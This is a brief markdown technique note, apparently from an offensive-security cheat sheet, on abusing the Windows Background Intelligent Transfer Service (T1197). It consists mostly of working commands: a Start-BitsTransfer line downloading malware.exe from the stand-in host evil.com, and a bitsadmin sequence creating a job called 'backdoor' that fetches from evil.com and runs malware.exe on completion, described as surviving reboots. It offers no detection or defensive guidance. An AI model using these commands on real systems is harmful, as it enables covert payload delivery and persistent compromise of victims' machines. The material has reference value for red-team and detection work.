---
title: BITS Jobs
tags: [persistence, bits, file-transfer, lolbas]
description: Using the Background Intelligent Transfer Service for persistence and data transfer.
date: 2024-01-02
---

# BITS Jobs (T1197)

BITS is used by Windows Update to download files in the background. It mimics user behavior perfectly.

## 1. File Transfer (Ingress/Exfiltration)
Downloading a payload even if the browser is closed.
```powershell
Start-BitsTransfer -Source http://evil.com/malware.exe -Destination C:\Temp\malware.exe
```

## 2. Persistence
BITS can execute a command when a job completes or errors.
```bash
bitsadmin /create backdoor
bitsadmin /addfile backdoor http://evil.com/test.txt C:\Temp\test.txt
bitsadmin /SetNotifyCmdLine backdoor cmd.exe "/c malware.exe"
bitsadmin /resume backdoor
```
- **Mechanism**: The job tries to download. When it finishes (or fails), it runs `malware.exe`.
- **Stealth**: Survived reboots if not cancelled.
